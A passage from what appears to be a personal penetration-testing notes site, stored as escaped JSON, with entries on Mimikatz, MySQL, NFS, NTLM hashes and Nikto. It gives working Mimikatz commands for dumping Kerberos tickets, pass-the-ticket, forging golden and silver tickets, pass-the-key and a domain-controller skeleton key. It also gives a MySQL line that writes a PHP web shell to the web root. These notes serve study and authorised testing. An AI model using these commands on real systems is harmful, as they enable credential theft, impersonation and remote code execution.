id=&quot;dumping-kerberos-tickets&quot;&gt;Dumping Kerberos tickets&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#dumping-kerberos-tickets&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Mimikatz can dump ticket granting tickets (and session keys) from the memory of Windows’ Local Security Authority Subsystem Service (LSASS); these can then be used to for privilege elevation or lateral movement (depending on which users are active on that machine).&lt;/p&gt;\n&lt;p&gt;Use the &lt;code&gt;sekurlsa::tickets /export&lt;/code&gt; command to dump any &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt; “tickets” (really ticket + session key data structures) from LSASS’s memory as .kirbi files. Tickets are named like ID-USER-SERVICE-DOMAIN.kirbi; ticket granting tickets have a krbtgt SERVICE name. If you can find a krbtgt ticket belonging to an administrator account, then you’ve (almost) struck gold.&lt;/p&gt;\n&lt;h2 id=&quot;pass-the-ticket-attacks&quot;&gt;Pass the ticket attacks&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#pass-the-ticket-attacks&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Mimikatz can extract &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt; TGT/TGS tickets and session keys:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;privilege::debug\nsekurlsa::tickets /export\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Note that TGTs for all users are available if you can run as SYSTEM; these allow TGS tickets to be requested for any service the corresponding user has access to. If you’re not running as SYSTEM, then you can get TGS tickets for the &lt;em&gt;current&lt;/em&gt; user, which will give you access to those services the current user has permission to use (and has accessed recently).&lt;/p&gt;\n&lt;p&gt;Mimikatz can then inject tickets into the current session:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;kerberos::ptt $KIRBI_FILENAME_FOR_TICKET_TO_INJECT\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;This allows the account you’re logged in as to (automatically!) “pass the ticket” and impersonate the user whose ticket you’ve harvested. The Windows built-in command klist will provide a list of currently active tickets.&lt;/p&gt;\n&lt;h2 id=&quot;golden-and-silver-ticket-attacks&quot;&gt;Golden and silver ticket attacks&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#golden-and-silver-ticket-attacks&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;To generate &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt; &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Golden-and-silver-ticket-attacks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Golden-and-silver-ticket-attacks&quot;&gt;golden and silver tickets&lt;/a&gt; using Mimikatz, begin by running the &lt;code&gt;lsadump::lsa /inject /name:$SERVICE&lt;/code&gt; command to retrieve the service SID and &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/NTLM-hashes&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/NTLM-hashes&quot;&gt;NTLM password hash&lt;/a&gt; for that service. If SERVICE is krbtgt then this will allow the creation of a golden ticket, otherwise you’ll be creating a silver ticket.&lt;/p&gt;\n&lt;p&gt;(You can also use a user name instead of &lt;code&gt;$SERVICE&lt;/code&gt;, in which case it appears that Mimikatz will just request a ticket granting ticket from the KDC as that user in the next step; this is theoretically just as noisy as a golden ticket, but looks more “normal”.)&lt;/p&gt;\n&lt;p&gt;To actually create and cache the ticket, use &lt;code&gt;Kerberos::golden /user:$USER /domain:$DOMAIN /sid:$SID /krbtgt:$HASH /id:$TYPE&lt;/code&gt;, where:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;$USER&lt;/code&gt; is the user to create the ticket for (probably the one you’ve compromised).&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;$DOMAIN&lt;/code&gt; is the domain to create the ticket for.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;$SID&lt;/code&gt; is the SID of the service from the previous step.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;$HASH&lt;/code&gt; is the NT hash of the service password from the previous step.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;$TYPE&lt;/code&gt; is the type of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt; ticket to create; use 500 for a golden (ticket granting) ticket, and 1103 for a service ticket.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Once the ticket has been created, use &lt;code&gt;misc::cmd&lt;/code&gt; to open a command prompt using the newly forged ticket.&lt;/p&gt;\n&lt;h2 id=&quot;pass-the-key-attacks&quot;&gt;Pass the key attacks&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#pass-the-key-attacks&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;“Pass the key” attacks rely on the fact that &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt; TGTs are granted based on an encrypted timestamp, so if we can get access to these objects we can request TGTs as the corresponding user. Turns out that these also hang out in memory and can be extracted with Mimikatz:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;privilege::debug\nsekurlsa::ekeys\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;These keys can be injected into a command environment just like an NTLM hash, though you need to know how they’re encrypted. For example, for an AES256 encrypted key:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;token::revert\nsekurlsa::pth /user:$TARGET_USER /domain:$TARGET_DOMAIN /aes256:$TARGET_USER_KERBEROS_KEY /run:&quot;$FULL_COMMAND_INCLUDING_ARGUMENTS&quot;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Other options include &lt;code&gt;/aes128&lt;/code&gt; and &lt;code&gt;/rc4&lt;/code&gt; for those styles of encryption, though RC4 isn’t something that you’re likely to see as it’s weak and disabled by default. (Because of a historical quirk, the RC4 key is actually &lt;em&gt;not&lt;/em&gt; a timestamp, but rather the user’s NTLM hash. So &lt;em&gt;iff&lt;/em&gt; RC4 is enabled on a domain, then extracting a user’s NTLM hash is sufficient to request &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt; TGTs as that user!)&lt;/p&gt;\n&lt;h2 id=&quot;kdc-skeleton-key&quot;&gt;KDC skeleton key&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#kdc-skeleton-key&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;If Mimikatz is run on a domain controller, it can modify the authentication service’s memory using the &lt;code&gt;misc::skeleton&lt;/code&gt; command to cause it to attempt to decrypt the AS-REQ using &lt;em&gt;both&lt;/em&gt; the user’s NT hash &lt;em&gt;and&lt;/em&gt; an NT hash of your choosing (by default &lt;code&gt;60BA4FCADC466C7A033C178194C03DF6&lt;/code&gt;, which is just &lt;code&gt;mimikatz&lt;/code&gt;).  This means that you can send an AS-REQ as any user using the “skeleton key” hash to gain access as that user, similar to a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Golden-and-silver-ticket-attacks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Golden-and-silver-ticket-attacks&quot;&gt;golden ticket attack&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;Obviously this isn’t very persistent itself, as the skeleton key will be lost if the server is rebooted or the authentication service restarted.&lt;/p&gt;\n&lt;h2 id=&quot;other-implementations&quot;&gt;Other implementations&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#other-implementations&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=&quot;meterpreter&quot;&gt;meterpreter&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#meterpreter&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Call-Mimikatz-from-a-meterpreter-shell&quot; data-block=&quot;&quot; data-embed-alias=&quot;Call Mimikatz from a meterpreter shell&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Call-Mimikatz-from-a-meterpreter-shell&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Call-Mimikatz-from-a-meterpreter-shell&quot;&gt;Transclude of Call-Mimikatz-from-a-meterpreter-shell&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h3 id=&quot;pure-powershell-implementation&quot;&gt;Pure PowerShell implementation&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#pure-powershell-implementation&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Invoke-Mimikatz&quot; data-block=&quot;&quot; data-embed-alias=&quot;Invoke-Mimikatz&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Invoke-Mimikatz&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Invoke-Mimikatz&quot;&gt;Transclude of Invoke-Mimikatz&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;"},"spells/MySQL":{"slug":"spells/MySQL","filePath":"spells/MySQL.md","title":"MySQL","links":["spells/SQL-injection-attacks"],"tags":["Application/MySQL","AttackCycle/Exploitation","AttackCycle/PrivEsc"],"content":"You can “upload” reverse shells using MySQL using INTO OUTFILE:\nSELECT &#039;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#039; INTO OUTFILE &#039;/var/www/html/cmd.php&#039;;\nThe path may require some brute-forcing or additional reconnaissance; sometimes you can force an error to return a (potentially) writeable path. Depending on how the application you’re attacking is configured, it may be possible to exploit this via SQLi.\nThis can be used to bootstrap reverse shells.","richContent":"&lt;p&gt;You can “upload” reverse shells using MySQL using &lt;code&gt;INTO OUTFILE&lt;/code&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;SELECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;&amp;#x3C;?php system($_GET[&quot;cmd&quot;]); ?&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; INTO&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; OUTFILE &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/var/www/html/cmd.php&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The path may require some brute-forcing or additional reconnaissance; sometimes you can force an error to return a (potentially) writeable path. Depending on how the application you’re attacking is configured, it may be possible to exploit this via &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SQL-injection-attacks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SQL-injection-attacks&quot;&gt;SQLi&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;This can be used to bootstrap reverse shells.&lt;/p&gt;"},"spells/NFS":{"slug":"spells/NFS","filePath":"spells/NFS.md","title":"NFS","links":[],"tags":["Protocol/NFS"],"content":"All versions of NFS use port 2049 to transfer data; NFSv1 – NFSv3 also depended on the “portmapper” service running on port 111, but this requirement was removed in NFSv4.\n# List NFS shares.\n#\nshowmount -e $SERVER_IP\n \n# Mount an NFS share.\n#\nsudo mount -t nfs ${SERVER_IP}:${SHARE_PATH} \\\n                  $LOCAL_MOUNT_DIR -nolock\n \n# Force-unmount an unresponsive share.\n#\nsudo umount -f $LOCAL_MOUNT_DIR\nNote that the mount directory must be owned by root.\nRoot squashing\nFiles created on NFS shares inherit the remote UID. By default, NFS enables “root squashing”, which maps UID 0 to the nobody user.\nRoot squashing can be disabled in /etc/exports with the no_root_squash flag. This is obviously insecure, however, as it allows a user that connects to that share as root to drop SUID binaries! (Remember that files on NFS mounts are created using the UID/GID values of the local user!)","richContent":"&lt;p&gt;All versions of NFS use port 2049 to transfer data; NFSv1 – NFSv3 also depended on the “portmapper” service running on port 111, but this requirement was removed in NFSv4.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# List NFS shares.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;showmount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SERVER_IP&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Mount an NFS share.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; mount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nfs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SERVER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SHARE_PATH&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;                  $LOCAL_MOUNT_DIR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -nolock&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Force-unmount an unresponsive share.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; umount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $LOCAL_MOUNT_DIR&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Note that the mount directory must be owned by root.&lt;/p&gt;\n&lt;h2 id=&quot;root-squashing&quot;&gt;Root squashing&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#root-squashing&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Files created on NFS shares inherit the &lt;em&gt;remote&lt;/em&gt; UID. By default, NFS enables “root squashing”, which maps UID 0 to the nobody user.&lt;/p&gt;\n&lt;p&gt;Root squashing can be &lt;em&gt;disabled&lt;/em&gt; in /etc/exports with the &lt;code&gt;no_root_squash&lt;/code&gt; flag. This is obviously insecure, however, as it allows a user that connects to that share as root to drop SUID binaries! (Remember that files on NFS mounts are created using the UID/GID values of the &lt;em&gt;local&lt;/em&gt; user!)&lt;/p&gt;"},"spells/NTLM-hashes":{"slug":"spells/NTLM-hashes","filePath":"spells/NTLM hashes.md","title":"NTLM hashes","links":[],"tags":["Cryptography/Hashes/NT","OS/Windows/SAM","Cryptography/Hashes/MD4","OS/Windows"],"content":"The Windows NT family uses NTLM for (network) logins, and stores hashes in the NT hash format, which is really just the md4 hash of the UTF-16-LE encoding of the user password (UTF-16-LE is the little endian version of UTF-16). While NTLM is the login protocol, people commonly call NT hashes “NTLM” hashes.\nThe “LM” in “NTLM” references the pre-NT password hashing mechanism, LM. LM hashes are constructed in an absolutely batshit crazy fashion, and are much weaker than (the already weak) NT hashes.\nWindows passwords are stored in the SAM, but NT and LM hashes (which can coexist on the same system) are stored in different data structures.","richContent":"&lt;p&gt;The Windows NT family uses NTLM for (network) logins, and stores hashes in the NT hash format, which is really just the md4 hash of the UTF-16-LE encoding of the user password (UTF-16-LE is the little endian version of UTF-16). While NTLM is the login protocol, people commonly call NT hashes “NTLM” hashes.&lt;/p&gt;\n&lt;p&gt;The “LM” in “NTLM” references the pre-NT password hashing mechanism, LM. &lt;a href=&quot;https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;LM hashes are constructed in an absolutely batshit crazy fashion&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, and are &lt;em&gt;much&lt;/em&gt; weaker than (the already weak) NT hashes.&lt;/p&gt;\n&lt;p&gt;Windows passwords are stored in the SAM, but NT and LM hashes (which can coexist on the same system) are stored in different data structures.&lt;/p&gt;"},"spells/Nikto":{"slug":"spells/Nikto","filePath":"spells/Nikto.md","title":"Nikto","links":[],"tags":["Application/Nikto","AttackCycle/Reconnaissance"],"content":"Nikto is a web application vulnerability scanner.\nnikto -Format txt -host $URL \\\n      -output $OUTPUT_FILE_WITH_EXTENSION\nIt can be used for basic web enumeration as well.\nGetting help:\nnikto -h            # Short help\nnikto -H            # Long help (all commands)\nnikto -list-plugins # List plugins","richContent":"&lt;p&gt;Nikto is a web application vulnerability scanner.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nikto&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -Format&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -host&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;      -output&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $OUTPUT_FILE_WITH_EXTENSION&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;It can be used for basic web enumeration as well.&lt;/p&gt;\n&lt;p&gt;Getting help:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nikto&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -h&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;            # Short help&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span 